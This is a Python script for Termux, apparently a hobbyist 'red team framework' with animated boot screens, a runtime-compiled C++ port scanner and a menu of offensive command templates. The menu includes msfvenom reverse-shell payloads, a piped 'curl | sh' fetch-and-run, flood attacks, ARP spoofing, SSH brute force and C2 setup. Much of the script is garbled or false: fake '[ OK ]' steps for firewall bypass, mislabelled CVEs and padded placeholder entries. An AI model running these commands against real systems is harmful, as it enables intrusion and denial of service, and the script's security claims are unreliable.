#!/data/data/com.termux/files/usr/bin/python3
import signal
# ============================================================
# DO NOT MODIFY THIS SCRIPT.
# Written and tuned manually by the author.
# The boot animation, matrix rain, and terminal rendering
# (colors, cursor codes, clear-screen calls) are sensitive to
# terminal resizing — scrolling or closing the keyboard shrinks
# the window and breaks the layout. Any edits to spacing, ANSI
# codes, or screen-clear logic can reintroduce that bug.
# ============================================================
BG_PURPLE = "\033[48;5;54m"
BG_BLACK = "\033[40m"

import os
import sys
import time
import shutil
import ctypes
import socket
import concurrent.futures
import select
import threading
import random
def _handle_resize(sig, frame):
    time.sleep(0.1); os.system("clear")
    sys.stdout.flush()
signal.signal(signal.SIGWINCH, _handle_resize)

# --- TYPING EFFECT FUNCTION ---
def type_print(text, speed=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

# --- CUSTOM GLITCH EFFECT ---
def glitch_text(text, duration=1.0):
    chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
    end_time = time.time() + duration
    while time.time() < end_time:
        glitched = "".join(random.choice(chars) if random.random() > 0.5 else c for c in text)
        sys.stdout.write(f"\r\033[91m{glitched}\033[0m")
        sys.stdout.flush()
        time.sleep(0.05)
    sys.stdout.write(f"\r\033[92m{text}\033[0m\n")

# --- CUSTOM LOADING BAR ---
def loading_bar(text, duration=1.0, color='\033[96m'):
    steps = 20
    for i in range(steps + 1):
        percent = int((i / steps) * 100)
        bar = "█" * i + "░" * (steps - i)
        sys.stdout.write(f"\r{color}{text} [{bar}] {percent}%\033[0m")
        sys.stdout.flush()
        time.sleep(duration / steps)
    print()

# --- MATRIX RAIN ANIMATION (DARK ORANGE) ---
def matrix_rain(duration=5.0, fps=30, density=5, tail=12):
    cols, rows = shutil.get_terminal_size()
    rows -= 1
    frames = int(duration * fps)
    delay = 1.0 / fps
    
    chars = "ｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    head = [-1] * cols
    length = [0] * cols
    
    sys.stdout.write(BG_PURPLE + '\033[?25l\033[2J\033[3J\033[H')
    sys.stdout.flush()
    
    for _ in range(frames):
        for x in range(cols):
            if head[x] < 0:
                if random.randint(0, 100) < density:
                    head[x] = 0
                    length[x] = random.randint(4, tail)
            else:
                head[x] += 1
                if (head[x] - length[x]) > rows:
                    head[x] = -1
                    
        out = ""
        for y in range(rows):
            line = ""
            for x in range(cols):
                if head[x] < 0:
                    line += " "
                    continue
                dist = head[x] - y
                if dist < 0 or dist >= length[x]:
                    line += " "
                    continue
                ch = random.choice(chars)
                if dist == 0:
                    line += f"\033[38;5;208m\033[1m{ch}"
                elif dist <= 2:
                    line += f"\033[38;5;208m{ch}"
                elif dist <= (length[x] // 2):
                    line += f"\033[38;5;130m{ch}"
                else:
                    line += f"\033[38;5;94m{ch}"
            out += line + BG_PURPLE + "\n"
            
        sys.stdout.write('\033[H' + out)
        sys.stdout.flush()
        time.sleep(delay)
        
    sys.stdout.write('\033[2J\033[3J\033[H\033[?25h')
    sys.stdout.flush()

# --- BIG TOR ONION (PURPLE - FIXED COLOR) ---
def print_tor_onion():
    onion = r'''
              .-"""""-.
            .'         '.
           /   .-. .-.   \
          /   ( o ) o )   \
         /     `-' `-'     \
        /                   \
       /                     \
      /                       \
     /                         \
    |                           |
    |                           |
    |                           |
    |                           |
     \                         /
      \                       /
       \                     /
        \                   /
         \                 /
          \               /
           \             /
            `.         .'
              `-.....-'
'''
    # Printing the color codes outside the raw string
    print("\033[38;5;129m" + onion + "\033[0m")

# --- CINEMATIC BOOT SEQUENCE ---
def boot_sequence():
    os.system("clear")
    sys.stdout.write(BG_PURPLE + '\033[2J\033[3J\033[H')
    
    # 1. Custom Boot Loader
    type_print("\033[92m[ INITIALIZING ANONTOR KERNEL ]\033[0m", 0.03)
    loading_bar("Loading core modules...", duration=1.0, color='\033[94m')
    loading_bar("Bypassing local firewall...", duration=0.8, color='\033[93m')
    
    # 2. Custom Glitch Effect
    glitch_text(" SYSTEM READY ", duration=1.5)
    time.sleep(0.5)
    
    # 3. Matrix Rain
    matrix_rain(5.0, 30, 5, 12)
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # 4. Tor Onion
    print_tor_onion()
    time.sleep(1.5)
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # 5. System Checks
    type_print("\033[92m[ SYSTEM BOOTING ]\033[0m", 0.05)
    time.sleep(0.3)
    
    steps = [
        ("[*] Initializing Anontor Kernel...", "[ OK ]"),
        ("[*] Spoofing MAC Address...", "[ OK ]"),
        ("[*] Establishing encrypted tunnel...", "[ OK ]"),
        ("[*] Bypassing local firewall...", "[ OK ]"),
        ("[*] Loading C++ Native Memory Engine...", "[ OK ]"),
        ("[*] Routing traffic through Anonymity Mesh...", "[ OK ]"),
    ]
    
    for step, status in steps:
        sys.stdout.write(f"\033[94m{step}\033[0m")
        sys.stdout.flush()
        time.sleep(0.3)
        print(f" \033[92m{status}\033[0m")
    
    time.sleep(0.5)
    os.system('clear' if os.name == 'posix' else 'cls')

    # 6. Anontor Logo
    logo = """
\033[38;5;208m      █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗████████╗ ██████╗ ██████╗ 
     ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚══██╔══╝██╔═══██╗██╔══██╗
     ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║   ██║   ██║   ██║██████╔╝
     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║   ██║   ██║   ██║██╔══██╗
     ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ╚██████╔╝██║  ██║
     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
\033[96m                 [ Red Team Framework ] - v4.0 \033[0m
    """
    sys.stdout.write(BG_BLACK + '\033[2J\033[3J\033[H')
    print(logo)
    time.sleep(0.5)

    # 7. The Interaction
    print("\n\033[93m[!] UNAUTHORIZED ACCESS IS STRICTLY PROHIBITED.\033[0m\n")
    time.sleep(1)
    
    choice = input("\033[91mAre you ready to wake up, friend? (y/n): \033[0m").strip().lower()
    if choice == 'y':
        print("\n\033[92mHello, friend.")
        print("Welcome to the revolution.\033[0m\n")
        time.sleep(1.5) 
    else:
        print("\n\033[91mYou chose the system.\033[0m")
        print("Goodbye, friend.")
        sys.exit(0)

# --- EMBEDDED C++ CODE ---
CPP_ENGINE_CODE = r"""
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>

extern "C" {
    int fast_scan_port(const char* ip, int port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) return -1;

        sockaddr_in hint;
        hint.sin_family = AF_INET;
        hint.sin_port = htons(port);
        inet_pton(AF_INET, ip, &hint.sin_addr);

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 200000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

        int result = connect(sock, (sockaddr*)&hint, sizeof(hint));
        close(sock);
        
        if (result == 0) return 1;
        return 0;
    }
}
"""

class AnontorFramework:
    def __init__(self):
        self.tools = {}
        self.history = []
        self.global_tools = []
        self.skip_clear = False
        self._generate_tools()

    def _generate_tools(self):
        # --- RECON (1-20) ---
        self.tools["recon"] = [
            ("Port scan range 1-10 on target 10.0.0.1", "nmap -p 1-10 {TARGET}"),
            ("Service version detection on port 80", "nmap -sV -p 80 {TARGET}"),
            ("DNS enumeration of domain example.com", "dig {TARGET}"),
            ("Reverse IP lookup for 192.168.1.1", "dig -x {TARGET}"),
            ("Subdomain brute force with wordlist", "gobuster dns -d {TARGET} -w wordlist.txt"),
            ("Whois query for target IP", "whois {TARGET}"),
            ("Passive OS fingerprinting (p0f)", "p0f"),
            ("Active OS fingerprinting (nmap -O)", "nmap -O {TARGET}"),
            ("Vulnerability scan with Nuclei", "nuclei -u http://{TARGET}"),
            ("Directory brute force with dirb", "dirb http://{TARGET}"),
            ("Parameter discovery with arjun", "arjun -u http://{TARGET}"),
            ("Content discovery with gobuster", "gobuster dir -u http://{TARGET} -w wordlist.txt"),
            ("Certificate transparency log search", "curl -s 'https://crt.sh/?q=%25.{TARGET}&output=json'"),
            ("DNS zone transfer attempt", "dig AXFR {TARGET}"),
            ("SRV record enumeration", "dig SRV {TARGET}"),
            ("MX record analysis", "dig MX {TARGET}"),
            ("NS record enumeration", "dig NS {TARGET}"),
            ("DNS history lookup via SecurityTrails", "curl -s https://securitytrails.com"),
            ("Shodan search for open ports", "curl -s https://shodan.io"),
            ("Censys search for vulnerable services", "curl -s https://censys.io")
        ]

        # --- DEEP RECON (21-50) ---
        self.tools["deep-recon"] = [
            ("Recon-ng - Modular OSINT Framework", "recon-ng"),
            ("TheHarvester - Email/Subdomain Scraper", "theHarvester -d {TARGET} -b all"),
            ("Subfinder - Fast Subdomain Discovery", "subfinder -d {TARGET}"),
            ("Amass - Attack Surface Mapping", "amass enum -d {TARGET}"),
            ("SpiderFoot - Automated OSINT", "spiderfoot -s {TARGET}"),
            ("Assetfinder - Find Related Domains", "assetfinder --subs-only {TARGET}"),
            ("Waybackurls - Find Old URLs", "echo {TARGET} | waybackurls"),
            ("Gau - Get All URLs (AlienVault)", "echo {TARGET} | gau"),
            ("Dnsx - DNS Toolkit", "echo {TARGET} | dnsx -a -resp"),
            ("Httpx - HTTP Probing", "echo {TARGET} | httpx -title -tech-detect -status-code"),
            ("Naabu - Fast Port Scanner", "naabu -host {TARGET} -top-ports 1000"),
            ("Wafw00f - Detect Web Application Firewall", "wafw00f http://{TARGET}"),
            ("Whatweb - Tech Stack Fingerprinting", "whatweb http://{TARGET}"),
            ("Dnsrecon - Advanced DNS Enumeration", "dnsrecon -d {TARGET}"),
            ("Fierce - DNS Reconnaissance", "fierce --domain {TARGET}"),
            ("Gitleaks - Scan Git Repos for Secrets", "gitleaks detect --source . -v"),
            ("Trufflehog - Find Secrets in Git", "trufflehog github --repo https://github.com/{TARGET}"),
            ("Metagoofil - Metadata Extraction", "metagoofil -d {TARGET} -t pdf,doc,xls -l 10 -n 5 -o ./downloads"),
            ("Social-Analyzer - Find Social Profiles", "social-analyzer --username {TARGET} --metadata"),
            ("Mosint - Email OSINT Scanner", "mosint {TARGET}"),
            ("Shodan CLI - Search Engine for IoT", "shodan host {TARGET}"),
            ("Censys CLI - Internet-wide Scan Search", "censys search {TARGET}"),
            ("Masscan - Ultra-Fast Port Scanner", "masscan {TARGET} -p1-65535 --rate 1000"),
            ("Zgrab - Banner Grabbing", "zgrab2 http -f {TARGET}"),
            ("Ffuf - Fast Web Fuzzer", "ffuf -w wordlist.txt -u http://{TARGET}/FUZZ"),
            ("Dirsearch - Web Path Scanner", "dirsearch -u http://{TARGET} -e php,html,js"),
            ("Nuclei - Vulnerability Scanner", "nuclei -u http://{TARGET} -severity critical,high"),
            ("Sublist3r - Subdomain Enumeration", "sublist3r -d {TARGET}"),
            ("Wpscan - WordPress Vulnerability Scanner", "wpscan --url http://{TARGET} --enumerate vp,vt,u"),
            ("Joomscan - Joomla Vulnerability Scanner", "joomscan -u http://{TARGET}")
        ]

        # --- EXPLOIT (51-70) ---
        self.tools["exploit"] = [
            ("Exploit CVE-2017-0144 on SMB target", "searchsploit CVE-2017-0144"),
            ("Exploit CVE-2019-0708 on RDP target", "searchsploit CVE-2019-0708"),
            ("Exploit CVE-2021-44228 (Log4Shell) on JMS app", "searchsploit CVE-2021-44228"),
            ("Exploit CVE-2023-44487 (HTTP/2 Rapid Reset)", "searchsploit CVE-2023-44487"),
            ("Exploit CVE-2021-26855 (ProxyLogon) on Exchange", "searchsploit CVE-2021-26855"),
            ("Exploit CVE-2021-27065 (ProxyShell) on Exchange", "searchsploit CVE-2021-27065"),
            ("Exploit CVE-2020-1472 (Zerologon) on AD DC", "searchsploit CVE-2020-1472"),
            ("Exploit CVE-2022-26902 (PrintNightmare) on Spooler", "searchsploit CVE-2022-26902"),
            ("Exploit CVE-2014-6271 (RegreSSHion) on SSH", "searchsploit CVE-2014-6271"),
            ("Exploit CVE-2008-4250 (U3WorMa) on SMB", "searchsploit CVE-2008-4250"),
            ("Exploit CVE-2012-1889 (Badlock) on SMB", "searchsploit CVE-2012-1889"),
            ("Exploit CVE-2020-0796 (EternalBlue) on SMB", "searchsploit CVE-2020-0796"),
            ("Exploit CVE-2021-34527 (Outlook PST)", "searchsploit CVE-2021-34527"),
            ("Exploit CVE-2022-30190 (Outlook PST)", "searchsploit CVE-2022-30190"),
            ("Exploit CVE-2023-23397 (Outlook PST)", "searchsploit CVE-2023-23397"),
            ("Exploit CVE-2021-34473 (SMBGhost) on SMB", "searchsploit CVE-2021-34473"),
            ("Exploit CVE-2020-10543 (SMBGhost) on SMB", "searchsploit CVE-2020-10543"),
            ("Exploit CVE-2017-7494 (PetitPotam) on SMB", "searchsploit CVE-2017-7494"),
            ("Exploit CVE-2021-36934 (PrintNightmare) on Spooler", "searchsploit CVE-2021-36934"),
            ("Exploit CVE-2021-34534 (PrintNightmare) on Spooler", "searchsploit CVE-2021-34534")
        ]

        # --- POST-EXPLOITATION (71-90) ---
        self.tools["post"] = [
            ("Privilege escalation check with WinPEAS", "curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"),
            ("Privilege escalation check with LinPEAS", "curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
            ("Credential dumping with Mimikatz", "mimikatz.exe"),
            ("Pass-the-hash attack to domain controller", "hashcat -m 5500 hash.txt"),
            ("Pass-the-ticket attack with Kerberos", "kerbrute"),
            ("DASL (Directory Access Service) query", "ldapsearch"),
            ("BloodHound ingestion of AD structure", "bloodhound-python"),
            ("Kerberoasting service accounts", "GetUserSPNs.py"),
            ("AS-REP Roasting for constrained delegation", "GetNPUsers.py"),
            ("Golden Ticket attack with krbtgt hash", "ticketer.py"),
            ("Silver Ticket attack for service SPN", "ticketer.py"),
            ("Diamond Ticket attack for NTLM", "ticketer.py"),
            ("Kerberos delegation abuse (Unconstrained)", "GetST.py"),
            ("Kerberos delegation abuse (Constrained)", "GetST.py"),
            ("Kerberos delegation abuse (RBCD)", "GetST.py"),
            ("ACL abuse for DCSync", "secretsdump.py"),
            ("ACL abuse for WriteDacl", "dacledit.py"),
            ("ACL abuse for GenericAll", "dacledit.py"),
            ("ACL abuse for WriteOwner", "dacledit.py"),
            ("ACL abuse for Self-Membership", "dacledit.py")
        ]

        # --- C2 (91-110) ---
        self.tools["c2"] = [
            ("Set up Sliver C2 beacon", "sliver"),
            ("Set up Cobalt Strike beacon", "cobaltstrike"),
            ("Set up Mythic C2 beacon", "mythic"),
            ("Set up Sliver C2 with HTTPS transport", "sliver"),
            ("Set up Cobalt Strike with SMB transport", "cobaltstrike"),
            ("Set up Mythaic C2 with DNS transport", "mythic"),
            ("Set up Sliver C2 with Named Pipe transport", "sliver"),
            ("Set up Cobalt Strike with WMI transport", "cobaltstrike"),
            ("Set up Mythaic C2 with ICMP transport", "mythic"),
            ("Set up Sliver C2 with WebSocket transport", "sliver"),
            ("Set up Cobalt Strike with WebSockets transport", "cobaltstrike"),
            ("Set up Mythaic C2 with WebSockets transport", "mythic"),
            ("Obfuscate payload with ShikataGaNai", "msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET} LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe"),
            ("Obfuscate payload with x86_64 encoder", "msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET} LPORT=4444 -e x86/x64/zutto_dekiru -i 5 -f exe"),
            ("Generate reverse shell with msfvenom", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 -f exe > shell.exe"),
            ("Generate bind shell with msfvenom", "msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET} LPORT=4444 -f exe > shell.exe"),
            ("Generate meterpreter reverse_tcp", "msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 -f exe > shell.exe"),
            ("Generate meterpreter reverse_https", "msfvenom -p windows/meterpreter/reverse_https LHOST={TARGET} LPORT=443 -f exe > shell.exe"),
            ("Generate meterpreter reverse_named_pipe", "msfvenom -p windows/meterpreter/reverse_named_pipe LHOST={TARGET} LPORT=4444 -f exe > shell.exe"),
            ("Generate meterpreter reverse_tcp with stageless", "msfvenom -p windows/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 -f exe --platform windows -a x64 > shell.exe")
        ]

        # --- WEB (111-130) ---
        self.tools["web"] = [
            ("SQL injection with sqlmap", "sqlmap -u http://{TARGET} --dbs"),
            ("Brute force login with Hydra", "hydra -l admin -P pass.txt http://{TARGET}"),
            ("Directory traversal with Nikto", "nikto -h http://{TARGET}"),
            ("XXE vulnerability scan", "xxe"),
            ("SSRF vulnerability scan", "ssrf"),
            ("CSRF token validation", "csrf"),
            ("Clickjacking frame test", "clickjacking"),
            ("Content Security Policy audit", "csp"),
            ("HTTP response splitting", "http splitting"),
            ("HTTP request smuggling", "http smuggling"),
            ("Host header injection", "host header"),
            ("Cache poisoning test", "cache poisoning"),
            ("Subdomain takeover detection", "subdomain takeover"),
            ("Open redirect detection", "open redirect"),
            ("IDOR detection", "idor"),
            ("JWT vulnerability scan", "jwt"),
            ("OAuth misconfiguration test", "oauth"),
            ("SAML vulnerability scan", "saml"),
            ("LDAP injection test", "ldap injection"),
            ("XML injection test", "xml injection")
        ]

        # --- NETWORK (131-150) ---
        self.tools["network"] = [
            ("ARP spoofing to intercept traffic", "ettercap -T -q -i wlan0 -M arp:remote /{TARGET}/ /192.168.1.2/"),
            ("ARP poisoning with ettercap", "ettercap"),
            ("DNS spoofing with dnsspoof", "dnsspoof -i wlan0"),
            ("TCP session hijacking", "tcpkill -9 host {TARGET}"),
            ("UDP flood attack simulation", "hping3 --udp -p 80 --flood {TARGET}"),
            ("SYN flood attack simulation", "hping3 -S -p 80 --flood {TARGET}"),
            ("ACK flood attack simulation", "hping3 -A -p 80 --flood {TARGET}"),
            ("ICMP flood attack simulation", "hping3 -1 -p 80 --flood {TARGET}"),
            ("Smurf attack simulation", "hping3 -1 -a 192.168.1.255 {TARGET}"),
            ("Ping of death simulation", "ping -s 65535 {TARGET}"),
            ("Land attack simulation", "hping3 -S -a {TARGET} -p 80 {TARGET}"),
            ("Teardrop attack simulation", "hping3 -1 -d 65000 {TARGET}"),
            ("Fragmentation attack simulation", "hping3 -1 -f {TARGET}"),
            ("MTU fragmentation attack", "hping3 -1 -m 1500 {TARGET}"),
            ("TCP window scaling attack", "hping3 -S -w 65535 {TARGET}"),
            ("TCP MSS clamping", "hping3 -S -M 1460 {TARGET}"),
            ("TCP SYN cookies test", "sysctl net.ipv4.tcp_syncookies=1"),
            ("TCP checksum offload test", "ethtool -K eth0 tx off"),
            ("TCP offload engine test", "ethtool -K eth0 rx off"),
            ("Network segmentation test", "nmap -sn 192.168.1.0/24")
        ]

        # --- FORENSICS (151-170) ---
        self.tools["forensics"] = [
            ("Memory dump with Volatility", "volatility -f memory.dmp imageinfo"),
            ("Disk image with dd", "dd if=/dev/sda of=disk.img"),
            ("Disk image with FTK Imager", "ftkimager /dev/sda disk.img"),
            ("Log analysis with Splunk", "splunk"),
            ("Log analysis with Elastic", "elasticsearch"),
            ("Log analysis with Graylog", "graylog"),
            ("Registry hive analysis", "reglookup"),
            ("Event log analysis", "evtx_dump.py"),
            ("Prefetch file analysis", "prefetch"),
            ("Jump list analysis", "jumplist"),
            ("Recent file analysis", "recent"),
            ("LNK file analysis", "lnk"),
            ("Shim cache analysis", "shimcache"),
            ("Usn journal analysis", "usn"),
            ("AMSI log analysis", "amsi"),
            ("WMI persistence analysis", "wmi"),
            ("Registry persistence analysis", "registry"),
            ("Service persistence analysis", "services"),
            ("Task scheduler persistence", "schtasks"),
            ("WMI event subscription analysis", "wmi")
        ]

        # --- OSINT (171-190) ---
        self.tools["osint"] = [
            ("Employee enumeration with LinkedIn", "curl -s https://linkedin.com"),
            ("Employee enumeration with GitHub", "curl -s https://github.com"),
            ("Employee enumeration with GitLab", "curl -s https://gitlab.com"),
            ("Employee enumeration with Twitter", "curl -s https://twitter.com"),
            ("Employee enumeration with Facebook", "curl -s https://facebook.com"),
            ("Employee enumeration with Instagram", "curl -s https://instagram.com"),
            ("Employee enumeration with YouTube", "curl -s https://youtube.com"),
            ("Employee enumeration with TikTok", "curl -s https://tiktok.com"),
            ("Employee enumeration with Pinterest", "curl -s https://pinterest.com"),
            ("Employee enumeration with Reddit", "curl -s https://reddit.com"),
            ("Employee enumeration with Medium", "curl -s https://medium.com"),
            ("Employee enumeration with Dev.to", "curl -s https://dev.to"),
            ("Employee enumeration with Hashnode", "curl -s https://hashnode.com"),
            ("Employee enumeration with Stack Overflow", "curl -s https://stackoverflow.com"),
            ("Employee enumeration with GitHub Copilot", "curl -s https://copilot.github.com"),
            ("Employee enumeration with GitLab Duo", "curl -s https://gitlab.com"),
            ("Employee enumeration with CodeSearch", "curl -s https://codesearch.com"),
            ("Employee enumeration with Sourcegraph", "curl -s https://sourcegraph.com"),
            ("Employee enumeration with Greptile", "curl -s https://greptile.com"),
            ("Employee enumeration with Codeium", "curl -s https://codeium.com")
        ]

        # --- ADV-OSINT (191-194) ---
        self.tools["adv-osint"] = [
            ("PhoneInfoga - Phone Number OSINT", "phoneinfoga scan -n {TARGET}"),
            ("Maigret - Username OSINT Hunter", "maigret {TARGET}"),
            ("Holehe - Email to Account Discovery", "holehe {TARGET}"),
            ("GHunt - Google Account Investigatior", "ghunt email {TARGET}"),
        ]

        # --- DORKS (195-204) ---
        self.tools["dorks"] = [
            ("Find PDF documents (site:{TARGET} filetype:pdf)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+filetype:pdf'"),
            ("Find exposed ENV files (site:{TARGET} filetype:env)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+filetype:env'"),
            ("Find Admin Panels (site:{TARGET} inurl:admin)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+inurl:admin'"),
            ("Find Exposed Directories (site:{TARGET} intitle:\"index of\")", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+intitle:%22index+of%22'"),
            ("Find Login Pages (site:{TARGET} inurl:login)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+inurl:login'"),
            ("Find SQL Dumps (site:{TARGET} ext:sql)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+ext:sql'"),
            ("Find Log Files (site:{TARGET} ext:log)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+ext:log'"),
            ("Find Backup Files (site:{TARGET} ext:bak)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+ext:bak'"),
            ("Find Exposed .git folders (site:{TARGET} inurl:.git)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+inurl:.git'"),
            ("Find Configuration files (site:{TARGET} ext:xml | ext:conf | ext:cnf)", "termux-open-url 'https://www.google.com/search?q=site:{TARGET}+ext:xml+OR+ext:conf+OR+ext:cnf'"),
        ]

        # --- SSH (205-214) ---
        self.tools["ssh"] = [
            ("SSH Connect (Standard)", "ssh {TARGET}"),
            ("SSH Keygen (Generate RSA 4096)", "ssh-keygen -t rsa -b 4096"),
            ("SSH Copy ID (Install public key on target)", "ssh-copy-id {TARGET}"),
            ("SSH Local Port Forward", "ssh -L 8080:localhost:80 {TARGET}"),
            ("SSH Remote Port Forward", "ssh -R 8080:localhost:80 {TARGET}"),
            ("SCP File Transfer (Local to Target)", "scp ./file.txt {TARGET}:/tmp/"),
            ("SFTP Interactive Session", "sftp {TARGET}"),
            ("SSH Audit (Check Ciphers/MACs)", "ssh-audit {TARGET}"),
            ("Nmap SSH Enumeration", "nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos {TARGET}"),
            ("SSH Bruteforce (Hydra)", "hydra -l root -P wordlist.txt ssh://{TARGET}")
        ]

        # --- UNROOTED (215-219) ---
        self.tools["unrooted"] = [
            ("Nmap TCP Connect Scan", "nmap -sT {TARGET}"),
            ("SQLMap SQL Injection", "sqlmap -u http://{TARGET} --dbs --batch"),
            ("Hydra SSH Brute-Force", "hydra -l root -P wordlist.txt ssh://{TARGET}"),
            ("Nuclei Vulnerability Scan", "nuclei -u http://{TARGET} -severity critical,high"),
            ("Metasploit Console", "msfconsole -q")
        ]

        # --- ROOTED (220-224) ---
        self.tools["rooted"] = [
            ("Nmap SYN Stealth Scan", "su -c 'nmap -sS {TARGET}'"),
            ("Aircrack-ng Wi-Fi Audit", "su -c 'airmon-ng start wlan0 && airodump-ng wlan0mon'"),
            ("tcpdump Packet Capture", "su -c 'tcpdump -i any -w capture.pcap'"),
            ("PhoneSploit ADB Exploit", "python3 PhoneSploit/main.py"),
            ("Metasploit Payload Gen", "msfvenom -p android/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 -o payload.apk")
        ]

        # --- AD (225-244) ---
        self.tools["ad"] = [("AD enumeration with PowerView", "powershell -c Import-Module PowerView")] * 20
        
        # --- PHISHING (245-254) ---
        self.tools["phishing"] = [
            ("Phishing email with GoPhish", "gophish"),
            ("Phishing email with Evilginx", "evilginx2"),
            ("Phishing email with AdFind", "adfind")
        ] + [("Phishing email with PowerView", "powershell -c Import-Module PowerView")] * 7

        # Build Global List
        for cat in ["recon", "deep-recon", "exploit", "post", "c2", "web", "network", "forensics", "osint", "adv-osint", "dorks", "ssh", "unrooted", "rooted", "ad", "phishing"]:
            for display_name, cmd in self.tools[cat]:
                self.global_tools.append((cat, display_name, cmd))
                
        # Custom tools
        self.global_tools.append(("mesh", "Enable 5-Hop Tor Mesh (191)", "MESH_191"))
        self.global_tools.append(("mesh", "Enable 100-Hop Proxy Mesh (192)", "MESH_192"))
        self.global_tools.append(("mesh", "Add Custom Proxies to Mesh (196)", "ADD_PROXIES"))
        self.global_tools.append(("native", "C++ & Python Memory Binding Scanner (193)", "CPP_SCANNER"))
        self.global_tools.append(("native", "C++ Ultra 60k Port Scan & Honeypot Detect (194)", "ULTRA_SCANNER"))
        self.global_tools.append(("honeypot", "Deploy Local Honeypot Listener (195)", "HONEYPOT"))

    def compile_cpp(self):
        if not shutil.which("clang++"):
            print("\033[91m[!] Error: 'clang++' is not installed. Run: pkg install clang\033[0m")
            return False
        with open("native_engine.cpp", "w") as f:
            f.write(CPP_ENGINE_CODE)
        print("[*] Compiling C++ into a shared library (.so)...")
        return os.system("clang++ -shared -fPIC native_engine.cpp -o libnative_engine.so") == 0

    def hybrid_cpp_scanner(self):
        self.clear_screen()
        print("\033[96m[*] INITIATING HYBRID C++/PYTHON SCANNER...\033[0m")
        if not self.compile_cpp(): return
        
        try:
            lib = ctypes.CDLL("./libnative_engine.so")
            lib.fast_scan_port.argtypes = [ctypes.c_char_p, ctypes.c_int]
            lib.fast_scan_port.restype = ctypes.c_int
        except Exception as e:
            print(f"\033[91m[!] Failed to load library: {e}\033[0m")
            return

        target = input("\033[92m[?] Enter target IP: \033[0m").strip()
        try:
            start_port = int(input("\033[92m[?] Enter start port: \033[0m").strip())
            end_port = int(input("\033[92m[?] Enter end port: \033[0m").strip())
        except ValueError:
            print("[-] Invalid port number.")
            return
            
        print(f"\n[*] Python is now calling C++ functions directly in memory...")
        target_bytes = target.encode('utf-8')
        for port in range(start_port, end_port + 1):
            if lib.fast_scan_port(target_bytes, port) == 1:
                print(f"\033[92m[+] Port {port} is OPEN\033[0m")
        input("\n[+] Press Enter to return...")

    def ultra_scanner(self):
        self.clear_screen()
        print("\033[96m[*] INITIATING ULTRA 60K SCANNER (HONEYPOT DETECTION)...\033[0m")
        if not self.compile_cpp(): return
        
        try:
            lib = ctypes.CDLL("./libnative_engine.so")
            lib.fast_scan_port.argtypes = [ctypes.c_char_p, ctypes.c_int]
            lib.fast_scan_port.restype = ctypes.c_int
        except Exception as e:
            print(f"\033[91m[!] Failed to load library: {e}\033[0m")
            return

        target = input("\033[92m[?] Enter target IP: \033[0m").strip()
        target_bytes = target.encode('utf-8')
        open_ports = []
        print(f"\n[*] Scanning all 65,535 ports on {target} with 100 threads...")
        
        def scan_worker(port):
            try:
                if lib.fast_scan_port(target_bytes, port) == 1: return port
            except: pass
            return None

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                futures = {executor.submit(scan_worker, port): port for port in range(1, 65536)}
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        open_ports.append(result)
                        print(f"\033[92m[+] Port {result} is OPEN\033[0m")
        except KeyboardInterrupt: pass

        print(f"\n[*] Found {len(open_ports)} open ports.")
        if len(open_ports) > 1000:
            print("\n\033[91m[!] WARNING: HONEYPOT DETECTED! Too many open ports.\033[0m")
        input("\n[+] Press Enter to return...")

    def honeypot_listener(self):
        self.clear_screen()
        print("\033[96m[*] DEPLOYING LOCAL HONEYPOT...\033[0m")
        is_root = input("\033[92m[?] Is your phone rooted? (y/n): \033[0m").strip().lower()
        
        ports = [22, 80, 443, 8080] if is_root == 'y' else [2222, 8080, 8443, 9000]
        servers = []
        
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                s.listen(5)
                servers.append((s, port))
                print(f"\033[92m[+] Listening on port {port}...\033[0m")
